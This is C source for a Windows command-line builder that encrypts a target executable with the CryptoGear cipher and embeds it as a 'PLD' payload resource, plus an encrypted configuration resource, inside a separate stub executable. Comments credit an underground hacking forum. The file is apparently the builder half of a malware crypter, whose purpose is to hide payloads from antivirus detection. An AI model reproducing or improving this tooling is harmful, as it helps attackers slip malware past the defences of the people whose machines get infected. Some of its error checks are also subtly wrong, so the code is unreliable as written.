#include <windows.h>  
#include <stdio.h>
#include "CryptoGear.h"

//small exe size tricks
//-----
#pragma optimize("gsy", on) // g (Global optimization), s (Favor small code), y (No frame pointers).
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text, EWR /IGNORE:4078")
#pragma comment(linker, "/OPT:NOWIN98") // Make section alignment really small.

#define WIN32_LEAN_AND_MEAN
//-----

char MainPassword[] = "GBWZO65A1x2TlKeZENtoGmbdWoU3mICyt7d6tjAy0OK1KaOAOh";

//use of CryptoGear by Viotto for encryption cipher, by wrh1d3 
void Cipher(unsigned char *Str, char Key[100], DWORD dSize) {
	CCryptoGear CryptoGear((unsigned char*)Key, strlen(Key), 0, 0);
	CryptoGear.Encrypt(Str, dSize);
}

bool SaveConfiguration(char *Filename, unsigned char *Buffer, DWORD bSize, char *ResourceName) {
	HANDLE hRes = BeginUpdateResource((LPCSTR)Filename, FALSE);
	if (!hRes) { return false; }
	BOOL Result = UpdateResource(hRes, RT_RCDATA, (LPCSTR)ResourceName, 0, Buffer, bSize);
	EndUpdateResource(hRes, FALSE); 
	if (Result) {
		return true;
	} else {
		return false;
	} 
}

bool LoadConfigurationFile(char *Filename, unsigned char* &Buffer) {
	DWORD bRead;
	HANDLE hFile = CreateFile((LPCSTR)Filename, GENERIC_READ, FILE_SHARE_READ, NULL, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (!hFile) { return false; }
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD dSize = GetFileSize(hFile, NULL);
	Buffer = (unsigned char *)malloc(dSize);
	BOOL Result = ReadFile(hFile, Buffer, dSize, &bRead, NULL);
	CloseHandle(hFile);
	
	if (!Result) {
		free(Buffer);
		return false;
	} else { 
		return true;
	}
}

//https://ax0nes.com/topic/1310-simple-check-does-filefolder-exists-c/, by Xash
bool FileExists(const char *Filename) {
	return !(GetFileAttributes(Filename) & FILE_ATTRIBUTE_DIRECTORY);
}

void PrintUsage(void) {
	printf("\nUsage: Console.exe [Options] target_file stub_file encryption_key\n\n\
[Options]\n\
  -h Help\tPrint this help message\n\
  -c Config\tWrite configuration file to stub\n\
  -t Target\tWrite target file to stub\n");
}

int main(int argc, char* argv[]) {
	DWORD bRead, bWrite;
	char Key[100];
	char StubFile[MAX_PATH], PEFile[MAX_PATH], CfgFile[MAX_PATH];
	
	//check parameters
	if (argc == 1) { 
		PrintUsage();
		return 0; 
	} 
	
	//set parameters
	if (!strcmp(argv[1], "-h")) {
		PrintUsage();
		return 0; 
	}
	
	else if (!strcmp(argv[1], "-c")) {
		if (!argv[2] || !FileExists(argv[2])) {
			printf("\n[-] Configuration file not found.\n");
			return -1; 
		}
		
		//check stub path location
		if (!argv[3] || !FileExists(argv[3])) {
			printf("\n[-] Stub file not found.\n");
			return -1; 
		}
	
		strncpy(CfgFile, argv[2], sizeof(CfgFile));
		CfgFile[sizeof(CfgFile) - 1] = '\0';
		
		strncpy(StubFile, argv[3], sizeof(StubFile));
		StubFile[sizeof(StubFile) - 1] = '\0';
		
		unsigned char *cfg_buffer;
		if (!LoadConfigurationFile(CfgFile, cfg_buffer)) {
			printf("\n[-] Failed to read configuration file.\n");
			return -1;
		}
		
		size_t lenStr = strlen((char *)cfg_buffer);
		unsigned char *Buffer = (unsigned char *)malloc(lenStr);
		memcpy(Buffer, cfg_buffer, lenStr);
		Cipher(Buffer, MainPassword, lenStr);
		if(!SaveConfiguration(StubFile, Buffer, lenStr + 1, (char *)"CFG")) {
			printf("\n[-] Failed to write configuration file.\n");
			return -1;
		}
		
		free(Buffer);
		
		printf("\n[+] Done!\n");
		return 0;
	}
	
	else if (!strcmp(argv[1], "-t")) {
		//check target path location
		if (!argv[2] || !FileExists(argv[2])) {
			printf("\n[-] Target file not found.\n");
			return -1; 
		}
		
		//check stub path location
		if (!argv[3] || !FileExists(argv[3])) {
			printf("\n[-] Stub file not found.\n");
			return -1; 
		}
	
		//check encryption key
		if (!argv[4]) {
			printf("\n[-] Invalid encryption key.\n");
			return -1; 
		}
		
		strncpy(PEFile, argv[2], sizeof(PEFile));
		PEFile[sizeof(CfgFile) - 1] = '\0';
		
		strncpy(StubFile, argv[3], sizeof(StubFile));
		StubFile[sizeof(StubFile) - 1] = '\0';
		
		strncpy(Key, argv[4], sizeof(Key));
		Key[sizeof(Key) - 1] = '\0';
		
		//write payload to stub
		HANDLE hFile = CreateFile((LPCSTR)PEFile, GENERIC_READ, FILE_SHARE_READ, NULL, 
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			
		if (!hFile) {
			printf("\n[-] Failed to read target file.\n");
			return -1; 	
		}
		
		DWORD dSize = GetFileSize(hFile, NULL);
		unsigned char *Buffer = (unsigned char *)malloc(dSize);
		
		if (!ReadFile(hFile, Buffer, dSize, &bRead, NULL)) {
			printf("\n[-] Failed to read target file.\n");
			return -1; 	
		}
		
		CloseHandle(hFile);
		
		Cipher(Buffer, Key, dSize); //encrypt target buffer
		if(!SaveConfiguration(StubFile, Buffer, dSize + 1, (char *)"PLD")) {
			printf("\n[-] Failed to write configuration file.\n");
			return -1;
		}
		
		free(Buffer);
		
		printf("\n[+] Done!\n");
		return 0;
	}
	
	PrintUsage();
	return 0; 
}
